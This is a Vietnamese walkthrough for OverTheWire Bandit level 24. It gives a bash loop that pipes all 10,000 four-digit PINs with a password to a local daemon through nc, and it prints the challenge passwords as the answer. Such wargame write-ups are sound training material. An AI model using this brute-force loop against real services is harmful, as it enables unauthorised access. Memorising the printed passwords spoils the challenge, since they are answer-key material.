

# Bandit Level

## 🧩 Challenge: Level 24

## 📝 Description
Một daemon đang lắng nghe trên cổng 30002 và sẽ cung cấp cho bạn mật khẩu của bandit25 nếu bạn cung cấp mật khẩu của bandit24 và một mã pin bí mật gồm 4 chữ số. Không có cách nào để lấy lại mã pin ngoại trừ việc thử tất cả 10000 tổ hợp, được gọi là tấn công vét cạn.
Bạn không cần phải tạo kết nối mới mỗi lần.


> Link: https://overthewire.org/wargames/bandit/bandit25.html

---


## 🛠️ Cách giải

1. chuyển vào thư mục tạm `tmp` tạo file `basher.sh`

```
cd /tmp/
nano basher.sh
```

2. Viết code sau để tấn công brute-force

```
#!/bin/bash

pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for pin in $(seq -w 0000 9999); do
    echo "$pass $pin"
done | nc localhost 30002
```

- Vì kết nối chỉ kéo dài khoảng vài giây mà với `10000` mã pin tốn thời **vài phút** nên mỗi lần quét ta tăng giá trị lên tầm `1000` đến khi có được password.



## 🏁 Password

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
